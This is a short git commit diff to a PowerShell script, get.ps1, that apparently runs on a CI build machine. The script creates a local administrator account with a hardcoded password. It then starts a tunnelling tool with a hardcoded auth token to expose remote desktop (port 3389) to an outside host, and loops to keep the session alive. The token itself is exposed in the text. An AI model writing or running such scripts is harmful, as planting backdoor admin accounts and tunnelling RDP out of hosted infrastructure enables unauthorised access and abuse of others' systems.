d100e04f0c3dbaf071696ed7d112a98acdbeab17
Usser1222 <163659668+Usser1222@users.noreply.github.com>
2024-03-16 20:00:19 +0300

    Update get.ps1

--- get.ps1
+++ get.ps1
@@ -1,8 +1,8 @@
 cmd /c net user /add Admin P@ssw0rd.
 cmd /c net localgroup /add administrators Admin
 
-use.exe authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
-use.exe tcp 3389 --log=stdout > C:\Users\circleci\Downloads\use.log
+cmd /c use.exe authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
+cmd /c use.exe tcp 3389 --log=stdout > C:\Users\circleci\Downloads\use.log
 
 $i = 10000000
 do {
